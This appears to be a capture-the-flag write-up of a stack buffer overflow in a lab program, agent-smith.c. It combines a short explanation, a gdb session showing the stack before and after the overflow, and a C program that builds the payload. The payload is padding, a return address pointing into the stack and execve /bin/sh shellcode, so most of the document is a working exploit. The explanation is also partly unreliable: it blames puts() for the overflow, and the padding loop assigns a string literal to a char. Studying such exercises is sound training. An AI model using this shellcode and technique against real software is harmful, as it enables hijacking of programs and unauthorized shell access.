The vulnerability lies in the c code of agent-smith.c. More specifically, the code in agent-smith 
reads a given file and expects that the first initial byte specifies the length of the input. By 
specifying a length of input > 127 bytes, you can buffer overflow msg[128] indirectly because 
puts(msg) will allow you to write a msg > 127 bytes to the buffer, thus, buffer overflowing 
the stack.

I determined which addresses to jump to by using these commands in the debugger:
& of $ebp: "p $ebp"
& of msg: "p & msg"


smith@pwnable:~$ invoke -d agent-smith pwnzerized

(gdb) break display
Breakpoint 1 at 0x80484b5: file agent-smith.c, line 9.
(gdb) run      
Starting program: /home/smith/agent-smith pwnzerized

Breakpoint 1, display (path=0xbffffe07 "pwnzerized") at agent-smith.c:9
9	  memset(msg, 0, 128);
(gdb) x/40x msg
(gdb) p $ebp
$1 = (void *) 0xbffffc48
(gdb) x/48x msg
0xbffffbb8:	0x00000001	0xb7fff938	0x00000000	0x00000000
0xbffffbc8:	0x00000000	0xb7fd2000	0xbffffc1e	0xbffffc1f
0xbffffbd8:	0x00000001	0xb7ec4269	0xbffffc1f	0xbffffc1e
0xbffffbe8:	0x00000000	0xb7ff3fdc	0xbffffca4	0x00000000
0xbffffbf8:	0x00000000	0xb7e5f043	0x0804828d	0x00000000
0xbffffc08:	0x00c10000	0x00000001	0xbffffdef	0x0000002f
0xbffffc18:	0xbffffc6c	0xb7fd2000	0x08048590	0x080483c0
0xbffffc28:	0x00000000	0x08048335	0xb7fd23e4	0x0000000d
0xbffffc38:	0x0804a000	0x080485e2	0x00000002	0xbffffd04
0xbffffc48:	0xbffffc68	0x0804857b	0xbffffe07	0x00000000
0xbffffc58:	0x08048599	0xb7fd2000	0x08048590	0x00000000
0xbffffc68:	0x00000000	0xb7e454d3	0x00000002	0xbffffd04
(gdb) s 1
11	  FILE *file = fopen(path, "r");
(gdb) s 1
12	  size_t n = fread(&size, 1, 1, file);
(gdb) s 1
13	  if (n == 0 || size > 128)
(gdb) s 1
15	  n = fread(msg, 1, size, file);
(gdb) s 1
17	  puts(msg); 
(gdb) x/48x msg
0xbffffbb8:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffbc8:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffbd8:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffbe8:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffbf8:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffc08:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffc18:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffc28:	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffc38:	0x000000c6	0xa8a8a8a8	0xa8a8a8a8	0xa8a8a8a8
0xbffffc48:	0xa8a8a8a8	0xbffffc50	0x895e1feb	0xc0310876
0xbffffc58:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbffffc68:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff


source code:
#include <stdio.h>

char shellcode[] = 
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07" 
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d" 
	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80" 
	"\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void main()
	{
		char pad[148] = "";
		int i = 0;
		for(; i < 148; i++)
			pad[i] = "\x41";
		printf("%s%s%s%s\n", "\x80", pad, "\x50\xfc\xff\xbf", shellcode);
}


